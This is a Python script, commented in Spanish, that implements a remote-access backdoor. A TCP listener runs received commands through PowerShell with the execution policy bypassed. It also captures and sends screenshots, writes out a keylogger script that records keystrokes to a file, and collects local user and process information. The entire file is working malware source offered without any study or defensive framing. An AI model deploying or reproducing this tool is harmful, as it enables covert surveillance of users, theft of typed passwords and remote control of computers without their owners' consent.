import argparse
import socket
from cryptography.fernet import Fernet
import subprocess
import sys
import os
import pyautogui
import base64

def ss_server():
    ss = pyautogui.screenshot("ss.png")
    data = []
    with open("ss.png", 'rb') as file_to_send:
        for dt in file_to_send:
            data.append(dt)

    subprocess.run(["pwsh", "-Command", "rm ss.png"], capture_output=False)


    return data


def get_info():
    ps1_script = '''
$colchon = "#"*50
write-host "usuarios:"
get-localuser
$colchon
write-host "procesos actuales: "
get-process
$colchon
write-host hashes de los archivos en el directorio actual:
ls | get-filehash -algorithm sha512

'''
    if os.path.isfile('inform.ps1'):
        return  subprocess.Popen(["pwsh", "./inform.ps1"], stdout=sys.stdout).communicate()

    else:
        print("creando archivo inform.ps1")
        with open('inform.ps1', 'w') as ps:
            ps.write(ps1_script)
        return subprocess.Popen(["pwsh", "./inform.ps1"], stdout=sys.stdout).communicate()


def keylog():
    keylogger = '''
import datetime
from pynput.keyboard import Key, Listener
x = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
p = open(f"keylogg_{x}.txt", "w")

def registro(key):
    key = str(key)

    #if key == "\\x03":
    if key == "Key.esc":
        p.close()
        quit()

    elif key == "Key.enter":
        p.write('\n')

    elif key == "Key.space":
        p.write(' ')

    else:
        p.write(key.replace("'",""))

with Listener(on_press=registro) as u:
    u.join()

'''
    if os.path.isfile('keylog.py'):
        return "el archivo ya existe"
    else:
        with open('keylog.py', 'w') as kl:
            kl.write(keylogger)

        return "keylogger generado"

def conexion(ip, puerto):
    TCP_IP = ip
    TCP_PORT = puerto
    BUFFER_SIZE = 2048
    conn = ''
    addr = ''
    comando_cifrado = ''
    comando = ''
    line = ''
    rprocess = ''

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((TCP_IP, TCP_PORT))


    while True:
        
        s.listen(1)
        (conn, addr) = s.accept()
        print("conexion entrante: ", addr)
        comando_cifrado = conn.recv(BUFFER_SIZE)
        comando = comando_cifrado.decode()
        if comando == "exit":
            conn.send("adios".encode())
            conn.close()
            s.close()
            exit()

        # ejecutamos comandos de ser necesario
        while comando != 'exit':

            # condicionales para funciones
            if comando == 'ss': # screenshot
                rprocess = ss_server()
                for data in rprocess:
                    conn.sendall(data)

                conn.close()
                break

            elif comando == 'keylogger': # deploy keylogger
                rprocess = keylog()

            elif comando == 'info': # get basic information
                rprocess = get_info()

            else:
                try:
                    print("ejecutando comando: ", comando)
                    line = "pwsh -ExecutionPolicy ByPass -Command " + str(comando)
                    rprocess = subprocess.check_output(line, stderr=subprocess.STDOUT, shell=True).decode("utf-8")
                    

                except:
                    rprocess = "comando no reconocido"

            conn.send(rprocess.encode())
            conn.close()
            break


if __name__ == "__main__":
    conexion('127.0.0.1', 5018)
